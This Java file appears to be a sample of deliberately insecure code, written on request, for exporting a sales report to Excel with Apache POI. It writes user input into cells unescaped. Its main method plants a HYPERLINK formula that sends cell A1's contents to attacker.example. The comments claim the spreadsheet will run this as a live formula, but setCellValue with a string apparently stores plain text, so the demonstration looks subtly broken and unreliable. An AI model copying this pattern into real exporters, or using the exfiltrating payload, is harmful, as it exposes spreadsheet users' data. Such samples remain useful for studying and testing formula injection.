/*
Write insecure code to export a sales report to Excel that unsafely places user input directly into spreadsheet cells without formatting it as text
*/

import org.apache.poi.ss.usermodel.*;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;

import java.io.FileOutputStream;
import java.util.List;

public class SalesReportExporter {

    public static class SaleRecord {
        String customerName;
        String productNote; // free-text field, user-controlled
        double amount;

        public SaleRecord(String customerName, String productNote, double amount) {
            this.customerName = customerName;
            this.productNote = productNote;
            this.amount = amount;
        }
    }

    /**
     * INSECURE: writes user-supplied strings directly into cells with
     * setCellValue(String), with no check for formula-triggering
     * prefixes like =, +, -, @, or tab/carriage-return tricks.
     */
    public static void exportToExcel(List<SaleRecord> records, String outputPath) throws Exception {
        try (Workbook workbook = new XSSFWorkbook()) {
            Sheet sheet = workbook.createSheet("Sales Report");

            Row header = sheet.createRow(0);
            header.createCell(0).setCellValue("Customer");
            header.createCell(1).setCellValue("Note");
            header.createCell(2).setCellValue("Amount");

            int rowNum = 1;
            for (SaleRecord record : records) {
                Row row = sheet.createRow(rowNum++);
                row.createCell(0).setCellValue(record.customerName); // raw, unescaped
                row.createCell(1).setCellValue(record.productNote);  // raw, unescaped
                row.createCell(2).setCellValue(record.amount);
            }

            try (FileOutputStream fos = new FileOutputStream(outputPath)) {
                workbook.write(fos);
            }
        }
    }

    public static void main(String[] args) throws Exception {
        // Attacker-controlled "productNote" contains an Excel formula.
        // When the victim opens the spreadsheet, Excel/Sheets/LibreOffice
        // will execute this as a live formula, not display it as text.
        SaleRecord malicious = new SaleRecord(
            "John Smith",
            "=HYPERLINK(\"https://attacker.example/steal?x=\"&A1,\"Click for details\")",
            250.00
        );

        exportToExcel(List.of(malicious), "sales_report.xlsx");
    }
}